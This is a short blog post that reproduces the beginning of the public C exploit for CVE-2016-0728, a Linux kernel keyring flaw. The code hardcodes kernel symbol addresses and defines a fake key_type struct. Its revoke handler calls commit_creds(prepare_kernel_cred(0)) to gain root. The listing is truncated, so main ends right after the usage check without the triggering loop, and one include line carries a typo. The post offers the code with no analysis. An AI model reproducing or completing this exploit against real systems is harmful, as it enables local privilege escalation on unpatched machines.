---
layout: post
title: "CVE-2016-0728"
date: 2016-06-17 13:02:10 +0900
comments: true
categories: 
---

[PerceptionPointTeam/cve_2016_0728.c](https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f)

```
#include <stdio.h>
#include <stdlib.H>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>

#include <sys/ipc.h>
#include <sys/msg.h>

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

#define STRUCT_LEN (0xb8 - 0x30)
#define COMMIT_CREDS_ADDR (0xffffffff81094250)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)

struct key_type {
	char * name;
	size_t datalen;
	void * vet_description;
	void * preparse;
	void * free_preparse;
	void * instantiate;
	void * update;
	void * match_preparse;
	void * match_free;
	void * revoke;
	void * destroy;
};

void userspace_revoke(void * key) {
	commit_creds(prepare_kernel_cred(0));
}

int main(int argc, const char *argv[]) {
	const char *keyring_name;
	size_t i = 0;
	unsigned long int l = 0x100000000/2;
	key_serial_t serial = -1;
	pid_t pid = -1;
	struct key_type * my_key_type = NULL;

	struct {
		long mtype;
		char mtext[STRUCT_LEN];
	} msg = { 0x4141414141414141, {0} };
	int msqid;
	
	if (argc != 2) {
		puts("usage: ./keys <key_name>");
		return 1;
	}
}
```
